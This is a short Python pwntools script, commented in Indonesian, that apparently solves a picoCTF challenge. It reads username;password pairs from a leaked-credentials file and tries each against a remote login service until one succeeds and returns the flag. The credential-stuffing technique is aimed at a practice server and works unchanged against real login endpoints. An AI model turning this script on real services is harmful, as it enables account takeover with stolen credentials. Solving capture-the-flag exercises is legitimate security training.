from pwn import *

HOST = "crystal-peak.picoctf.net"
PORT = 51430

# Konfigurasi log level pwntools ke 'error' agar terminal tidak penuh dengan log koneksi
context.log_level = 'error'

def try_login(username, password):
    try:
        # Membuka koneksi remote ke server
        conn = remote(HOST, PORT, timeout=5)

        # Menunggu prompt username dan mengirimkannya
        conn.recvuntil(b"Username:")
        conn.sendline(username.encode())

        # Menunggu prompt password dan mengirimkannya
        conn.recvuntil(b"Password:")
        conn.sendline(password.encode())

        # Membaca seluruh respons yang dikembalikan server
        response = conn.recvall(timeout=2).decode(errors="ignore")

        # Menutup koneksi
        conn.close()
        return response

    except Exception as e:
        return f"ERROR: {e}"


# Membaca file credentials
with open("creds-dump.txt") as f:
    for line in f:
        # Bersihkan spasi/newline dan pastikan baris tidak kosong
        line = line.strip()
        if not line or ";" not in line:
            continue
            
        # Memisahkan username dan password berdasarkan karakter ';'
        username, password = line.split(";", 1)

        print(f"[*] Trying {username}:{password}")

        response = try_login(username, password)

        # Cek jika terjadi error pada koneksi jaringan
        if "ERROR:" in response:
            print(f"[!] {response}")
            continue

        # Validasi respons (Sesuaikan berdasarkan teks sukses dari server CTF)
        if "Invalid" not in response:
            print("\n[!!!] SUCCESS! FLAG FOUND [!!!]")
            print(f"Credentials: {username}:{password}")
            print(response)
            break
